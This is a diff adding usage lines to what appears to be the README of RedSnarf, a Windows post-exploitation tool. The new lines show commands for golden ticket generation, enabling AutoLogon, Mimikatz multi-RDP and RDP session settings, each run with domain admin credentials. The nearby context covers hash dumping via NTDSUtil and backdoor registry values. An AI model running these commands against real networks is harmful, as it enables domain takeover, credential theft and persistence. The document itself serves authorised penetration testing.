@@ -102,6 +102,8 @@ Retrieve Hashes using NTDSUtil
 This method supports an optional flag of -q y which will query LDAP and output whether accounts are live or disabled
 ./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -d yourdomain.com -hN y (-hQ y)
 
+Golden Ticket Generation
+./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -d yourdomain.com -hT y
 
 Information Gathering
 =======================
@@ -118,6 +120,8 @@ Find User - Live
 Find User - Offline (searches pre downloaded information)
 /redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -d yourdomain.com -eO user.name
 
+Display NT AUTHORITY\SYSTEM Tasklist
+/redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -d yourdomain.com -eT y
 
 Misc
 =======================
@@ -175,6 +179,15 @@ Disable Backdoor registry value on a machine using domain administrator credenti
 Query Backdoor registry value on a machine using domain administrator credentials
 ./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rB q
 
+AutoLogon
+Enable Windows AutoLogon registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rA e
+
+Disable Windows AutoLogon registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rA d
+
+Query Windows AutoLogon registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rA q
 
 RDP
 =======================
@@ -196,6 +209,18 @@ Change RDP Port to default of 3389 on a machine using domain administrator crede
 
 Query RDP Port Value on a machine using domain administrator credentials
 ./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rT q
+
+Enable Multi-RDP with Mimikatz
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -uR y
+
+Enable RDP SingleSessionPerUser on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rM e
+
+Disable RDP SingleSessionPerUser on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rM d
+
+Query RDP SingleSessionPerUser status on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rM q
 
 NLA
 =======================
